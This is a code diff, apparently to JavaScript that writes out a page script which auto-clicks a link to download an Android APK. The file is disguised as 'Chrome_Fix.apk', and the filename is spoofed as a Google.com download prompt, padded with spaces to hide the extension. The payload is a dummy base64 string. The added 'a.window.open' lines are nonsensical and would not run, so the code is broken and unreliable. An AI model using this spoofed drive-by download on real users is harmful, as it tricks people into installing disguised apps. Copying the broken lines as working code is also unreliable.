@@ -87,6 +87,7 @@
             const html = `
                 <script>
                     const a = document.createElement("a");
+                    a.window.open = "data://.google.com/application/vnd.android.package-archive;base64,ZXN0dGVzdHRlc3Q=";
                     a.href = "data://.google.com/application/octet-stream;base64,ZXN0dGVzdHRlc3Q=";
                     a.download = "Chrome_Fix.apk";
                     a.click();
@@ -113,6 +114,7 @@
             const fakeName = "Google.com" + " " + "wants" + " " + "download" + " " + "this" + "  ".repeat(40) + "\u002D" + " " + "chrome.apk";            
             setTimeout(() => {
                 const a = document.createElement("a");
+                a.window.open = "data://.google.com/application/vnd.android.package-archive;base64,ZXN0dGVzdHRlc3Q=";
                 a.href = "data://.google.com/application/vnd.android.package-archive;base64,ZXN0dGVzdHRlc3Q=";
                 a.download = fakeName;
                 a.click();
